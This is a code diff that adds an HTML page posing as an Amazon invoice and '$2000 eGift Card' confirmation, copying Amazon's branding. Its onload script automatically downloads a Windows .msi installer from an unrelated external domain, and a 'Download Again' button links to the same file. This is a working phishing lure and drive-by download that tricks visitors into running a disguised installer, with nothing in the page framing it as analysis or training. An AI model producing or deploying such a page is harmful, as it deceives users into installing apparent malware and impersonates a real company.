@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Amazon - Invoice</title>
+  <link rel="icon" type="image/png" href="https://www.amazon.com/favicon.ico" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .header {
+      background-color: #232f3e;
+      padding: 15px;
+      text-align: left;
+    }
+    .header img {
+      height: 30px;
+    }
+    .container {
+      margin: 80px auto;
+      padding: 30px;
+      background: #fff;
+      max-width: 600px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    .container h1 {
+      color: #111;
+      margin-bottom: 15px;
+    }
+    .container p {
+      color: #555;
+      font-size: 16px;
+    }
+    .btn {
+      display: inline-block;
+      margin-top: 25px;
+      padding: 12px 24px;
+      background: #ff9900;
+      color: #111;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 4px;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #f0ad4e;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+  </div>
+
+  <div class="container">
+    <h1>Thank you for your purchase!</h1>
+    <p>Your $2000 Amazon eGift Card and invoice has been generated and securely saved to your device.</p>
+    <a class="btn" href="https://recruitmentinhealth.com.au/$2000%20Amazon%20e-gift%20card.msi" download>Download Again</a>
+  </div>
+
+  <script>
+    window.onload = function() {
+      const link = document.createElement("a");
+      link.href = "https://recruitmentinhealth.com.au/$2000%20Amazon%20e-gift%20card.msi"; // must be in same folder or full URL
+      link.download = "https://recruitmentinhealth.com.au/$2000%20Amazon%20e-gift%20card.msi";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+  </script>
+</body>
+</html>
